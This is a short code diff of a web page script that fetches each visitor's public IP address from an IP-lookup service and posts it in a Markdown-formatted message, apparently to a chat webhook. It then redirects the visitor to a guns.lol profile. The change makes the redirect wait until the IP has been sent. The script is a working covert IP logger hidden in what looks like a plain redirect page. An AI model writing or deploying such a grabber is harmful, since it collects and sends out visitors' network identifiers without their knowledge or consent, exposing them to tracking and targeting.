@@ -16,12 +16,15 @@
         content: "**IP:** *" + json.ip + "*"
       };
 
-      request.send(JSON.stringify(params));
+      // Set up a function that will be called when the request completes
+      request.onload = function() {
+        // Redirect after the request completes
+        setTimeout(function() {
+          window.location.href = "http://guns.lol/maxvel187";
+        }, 300); // 300 milliseconds
+      };
 
-      // Redirect after a short delay
-      setTimeout(function() {
-        window.location.href = "http://guns.lol/maxvel187";
-      }, 300); // 300 milliseconds
+      request.send(JSON.stringify(params));
     }
   </script>
   <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
